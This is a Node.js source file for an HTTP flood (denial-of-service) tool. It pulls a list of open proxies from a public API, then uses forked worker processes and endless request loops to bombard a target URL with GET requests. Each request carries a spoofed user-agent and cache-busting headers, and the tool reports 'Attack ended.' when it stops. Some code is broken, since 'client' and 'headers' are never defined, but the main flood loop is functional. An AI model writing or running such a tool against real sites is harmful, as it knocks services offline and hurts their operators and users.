require('events').EventEmitter.defaultMaxListeners = 0;

const clc = require('cli-color');

//console.log(clc.green(` __  __ _       _     _   _                         `));
//console.log(clc.green("|  \\/  (_)_ __ | |__ | | | | ___   __ _ _ __   __ _ "));
//console.log(clc.green("| |\\/| | | '_ \\| '_ \\| |_| |/ _ \\ / _` | '_ \\ / _` |"));
//console.log(clc.green(`| |  | | | | | | | | |  _  | (_) | (_| | | | | (_| |`));
//console.log(clc.green("|_|  |_|_|_| |_|_| |_|_| |_|\\___/ \\__,_|_| |_|\\__, |"));
//console.log(clc.green(`                                              |___/ `));

const request = require('request');
const axios = require('axios');
const fakeUa = require('fake-useragent');
const cluster = require('cluster');

async function attack() {
    if (process.argv.length !== 5){
        console.log(clc.red("Invalid arguments. Please use: "));
        console.log(clc.red("node main.js web times threads"));
        process.exit(0);
    } else {
        const target = process.argv[2];
        const times = process.argv[3];
        const threads = process.argv[4];

        // craw list proxies
        const proxyscrape_http = await axios.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all');
        var proxies = proxyscrape_http.data.replace(/\r/g, '').split('\n');
        console.log(clc.yellow((proxies ? proxies.length : 0) + " proxies"));

        function run() {
            var proxy = proxies[Math.floor(Math.random() * proxies.length)];
            var req = request.defaults({"request ": "http://"+proxy});
            var config = {
                method: 'GET',
                url: target,
                headers: {
                    'Cache-Control': 'no-cache',
                    'User-Agent': fakeUa()
                }
            };

            req(config, function(err, res){
                if (res.statusCode >= 200 && res.statusCode <= 226) {
                    console.log(clc.green(res.statusCode +" "+ res.statusMessage + ' Alive'));
                    for(let ix=0; ix <= 100; ix++){
                        req(config);
                    }
                } else {
                    console.log(clc.red(res.statusCode + res.statusMessage));
                    client.on('data', function () {
                        setTimeout(function () {
                            client.destroy();
                            return delete client;
                        }, 5000);
                    });
                    for (let i = 0; i < threads; ++i) {
                        client.write(
                            `GET ${target} HTTP/2` +
                            headers
                        );
                    }
                }
            });
        }

        function thread(){
            setInterval(()=>{
                run();
            });
        }

        async function main(){
            if (cluster.isMaster) {
                for (let i=0;i < threads; i++){
                    cluster.fork();
                }

                cluster.on('exit', function(){
                    cluster.fork();
                });
            } else {
                thread();
            }
        }

        main();

        setTimeout(()=>{
            console.log(clc.yellow("Attack ended."));
            process.exit(0);
        }, times*2000);
    }
}

attack();

process.on('uncaughtException', function (err) {});

process.on('unhandledRejection', function (err) {});